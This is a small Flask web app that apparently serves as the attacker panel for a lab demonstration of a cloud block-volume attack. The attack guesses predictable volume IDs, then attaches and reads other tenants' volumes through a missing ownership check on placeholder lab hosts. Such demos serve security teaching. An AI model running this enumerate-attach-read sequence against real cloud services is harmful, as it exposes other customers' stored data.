"""AttachMe-style attack: predictable ID + missing ownership check."""
import os

import requests
from flask import Flask, request

app = Flask(__name__)
API = os.environ.get("API_URL", "http://control-api:5000")
INSTANCE = os.environ.get("INSTANCE_URL", "http://attacker-instance:5000")

HTML = """<h1>AttachMe — Block Volume Attack</h1>
<form method="post" action="/enum"><h3>1 · guess a resource ID</h3>
<input name="vid" value="ocid.vol.1001"><button>Query</button></form>
<form method="post" action="/attach"><h3>2 · attach it to my instance</h3>
<input name="vid" value="ocid.vol.1001"><button>Attach</button></form>
<form method="post" action="/read"><h3>3 · read the volume</h3>
<input name="vid" value="ocid.vol.1001"><button>Read</button></form>
<pre>{{out}}</pre>"""


def render(out):
    return HTML.replace("{{out}}", out)


@app.route("/")
def home():
    return render("Ready")


@app.route("/enum", methods=["POST"])
def enum():
    vid = request.form.get("vid", "")
    r = requests.get(f"{API}/volumes/{vid}", timeout=8)
    return render(f"Query {vid}: {r.text}")


@app.route("/attach", methods=["POST"])
def attach():
    vid = request.form.get("vid", "")
    r = requests.post(f"{INSTANCE}/attach", params={"volume_id": vid}, timeout=8)
    return render(f"Attach {vid}: {r.text}")


@app.route("/read", methods=["POST"])
def read():
    vid = request.form.get("vid", "")
    r = requests.post(f"{INSTANCE}/read", params={"volume_id": vid}, timeout=8)
    return render(f"Read {vid}: {r.text}")


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
